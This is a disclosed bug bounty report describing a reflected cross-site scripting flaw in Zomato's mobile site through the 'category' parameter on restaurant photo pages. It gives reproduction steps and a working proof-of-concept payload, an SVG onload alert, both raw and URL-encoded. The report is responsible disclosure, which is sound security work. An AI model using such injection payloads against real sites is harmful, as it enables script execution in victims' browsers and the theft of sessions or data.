# Reflected XSS in Zomato Mobile - category parameter

## Report Details
- **Report ID**: 230119
- **URL**: https://hackerone.com/reports/230119
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2017-05-20T09:46:48.105Z
- **Disclosed**: 2017-06-26T13:03:21.975Z

## Reporter
- **Username**: harry_mg
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: zomato

## Vulnerability Information
Hi there. I have found a reflected XSS in Zomato.com mobile. This XSS affects mobile users of Zomato. Steps to reproduce:

1. Go to Zomato.com and change your user agent to mobile *(iPhone/Android user agent)*
2. Go to a certain restaurant/place and their photos *(e.g. site: https://www.zomato.com/manila/artsy-cafe-diliman-quezon-city/photos?category=ambience)*
3. Change the value in the ```category``` parameter to an XSS payload: ```
"--><%2Fscript><svg%2Fonload%3D'%3Balert(document.domain)%3B'>```
4. Final URL will look like this: https://www.zomato.com/manila/artsy-cafe-diliman-quezon-city/photos?category=%22--%3E%3C%2Fscript%3E%3Csvg%2Fonload%3D%27%3Balert%28document.domain%29%3B%27%3E

XSS will execute. POC attached.

Thanks and I hope you consider and fix this

## Attachments
- Screen_Shot_05-20-17_at_05.41_PM_001.PNG
- Screen_Shot_05-20-17_at_05.41_PM.PNG
